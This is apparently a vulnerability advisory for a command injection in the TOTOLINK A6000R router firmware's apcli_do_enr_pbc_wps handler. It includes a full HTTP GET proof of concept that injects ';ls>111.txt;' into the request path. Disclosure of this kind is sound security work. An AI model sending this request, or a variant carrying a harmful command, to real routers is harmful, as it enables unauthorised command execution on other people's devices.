# Vulnerability Title

TOTOLINK A6000R router has a command injection vulnerability

# Vulnerability Description
There is a command injection vulnerability in the apcli_do_enr_pbc_wps function in the TOTOLINK A6000R router firmware version V1.0.1-B20201211.2000.
An attacker can exploit this vulnerability to remotely execute system commands without authorization, causing the server to crash, which has a serious impact.

# Vulnerability Location
/admin/mtk/wifi/apcli_do_enr_pbc_wps/arg

# Firmware version
V1.0.1-B20201211.2000

# Code Analysis

There is a command injection vulnerability in the apcli_do_enr_pbc_wps function in the firmware version V1.0.1-B20201211.2000 of the TOTOLINK A6000R router. There is a command injection vulnerability in the apcli_do_enr_pbc_wps function in the /usr/lib/lua/luci/controller/mtkwifi.lua file, which is triggered by the iface parameter. 
An attacker can execute arbitrary commands on the router by constructing a special HTTP request.
![image](https://github.com/user-attachments/assets/bd408c48-6fa4-4003-9b2c-0f7d25d0cd21)


route:/admin/mtk/wifi/apcli_do_enr_pbc_wps/arg
![image](https://github.com/user-attachments/assets/d7692edf-115f-49af-b712-4d6ff357eff1)


# Local reproduction

By sending an HTTP GET request to a specific URL, you can inject commands into the iface parameter.
For example, you can inject the ls>111.txt command to list the directory contents to verify the existence of the vulnerability.
POC
```
GET /cgi-bin/luci/admin/mtk/wifi/apcli_do_enr_pbc_wps/;ls>111.txt; HTTP/1.1
Host: 192.168.187.136
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: sysauth=80c79bd6ad9bfba9656b7a8bee2a988f
```
![image](https://github.com/user-attachments/assets/a4a0b79a-493e-4536-9313-b7fc0886c04f)
![image](https://github.com/user-attachments/assets/88c6ed47-040e-4fd0-b305-e2b938482a43)

